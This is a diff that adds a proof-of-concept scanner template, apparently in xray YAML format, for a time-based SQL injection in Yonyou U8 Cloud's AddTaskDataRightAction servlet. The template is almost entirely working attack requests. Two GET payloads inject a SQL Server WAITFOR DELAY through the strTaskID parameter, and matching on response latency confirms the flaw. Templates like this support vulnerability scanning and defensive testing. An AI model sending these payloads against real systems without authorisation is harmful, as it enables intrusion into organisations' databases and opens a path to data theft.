@@ -1,0 +1,29 @@
+name: poc-yaml-yongyouU8-Cloud-AddTaskDataRightAction-sql
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.task.AddTaskDataRightAction&method=execute&strTaskID=1%27);WAITFOR+DELAY+%270:0:4%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: GET
+      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.task.AddTaskDataRightAction&method=execute&strTaskID=1%27);WAITFOR+DELAY+%270:0:8%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487295&idx=1&sn=2c539286bf77ff262154f3a334790b3f&chksm=c267ba0cf510331a490f7c604ed69f4c361a906ee3dc40c0a76ee5cffc879cb6f21b64cba507&token=2053938247&lang=zh_CN#rd
+
+
+
